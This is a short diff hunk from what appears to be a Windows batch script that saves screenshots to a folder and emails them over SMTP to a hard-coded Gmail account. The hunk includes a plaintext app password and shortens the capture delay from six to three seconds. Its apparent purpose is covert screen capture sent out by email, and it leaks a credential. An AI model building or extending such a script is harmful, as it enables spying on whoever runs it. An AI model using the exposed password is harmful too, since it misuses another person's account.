@@ -11,7 +11,7 @@ set "smtpPort=587"
 set "emailFrom=najlepszyclicker3@gmail.com"
 set "emailTo=najlepszyclicker3@gmail.com"
 set "emailPass=vdcsdgwewmdudpzn"
-set "delaySeconds=6"
+set "delaySeconds=3"
 
 if not exist "%screenshotFolder%" mkdir "%screenshotFolder%"
 
